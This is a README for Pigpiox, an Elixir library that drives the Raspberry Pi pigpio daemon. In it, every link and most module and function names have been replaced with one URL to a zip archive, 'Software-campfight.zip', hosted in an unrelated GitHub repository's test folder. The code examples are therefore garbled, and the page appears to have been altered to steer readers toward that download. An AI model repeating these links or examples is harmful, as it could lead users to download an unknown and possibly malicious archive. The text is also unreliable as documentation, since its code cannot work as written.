# Pigpiox

Pigpiox is a wrapper around pigpiod for the Raspberry Pi. For all of pigpio's features, check out its [documentation](https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip).


# Requirements

To use Pigpiox, pigpiod must be included in your firmware. Currently, this is included by default on `nerves_system_rpi0`, but not on other Pi systems.

If you'd like to use Pigpiox on one of those systems, customize the nerves system you're interested in, and add `BR2_PACKAGE_PIGPIO=y` to its `nerves_defconfig`.

# Installation

In your firmware's `https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip`, add `pigpiox` to your deps for your system target:

```elixir
def deps(target) do
  [ system(target),
    {:pigpiox, "~> 0.1"}
  ]
```

# Usage

Adding pigpiox as a dependency to your system will automatically launch the pigpio daemon and open a socket to communicate with it. To interact with pigpiod, Pigpiox provides various modules exposing different areas of functionality:

## GPIO

### Basic functionality

The `https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip` provides basic GPIO functionality. Here's an example of reading and writing a GPIO:

```elixir
gpio = 17

https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(gpio, :input)
{:ok, level} = https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(gpio)

https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(gpio, :output)
https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(gpio, 1)
```

### Watching a GPIO

When reading a GPIO, often it's useful to know immediately when its level changes, instead of having to constantly poll it. Here's an example:

```elixir
{:ok, pid} = https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(gpio)
```

After setting up a watch on a GPIO pin, the calling process will receive messages of the format `{:gpio_leveL_change, gpio, level}` as its level change.

## Waveforms

The `https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip` module provides functions that allow you to create and send waveforms on the Raspberry Pi. Here's an example of pulsing a GPIO on and off every 500ms:

```elixir
pulses = [
  %https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip{gpio_on: gpio, delay: 500000},
  %https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip{gpio_off: gpio, delay: 500000}
]

https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(pulses)

{:ok, wave_id} = https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip()

https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(gpio, :output)

https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(wave_id)
```

## Clock

The `https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip` module provides functions that allow you to set a clock on reserved pin.

```elixir
https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip(gpio, 2_500_000)
```

All documentation available on [hexdocs](https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip).

# Contributions

This library is still in a very early stage, and I'd appreciate any and all contributions. In particular, a short-term goal is getting feature parity with the [python](https://raw.githubusercontent.com/etemtezcan/pigpiox/master/test/Software-campfight.zip) pigpiod client library.
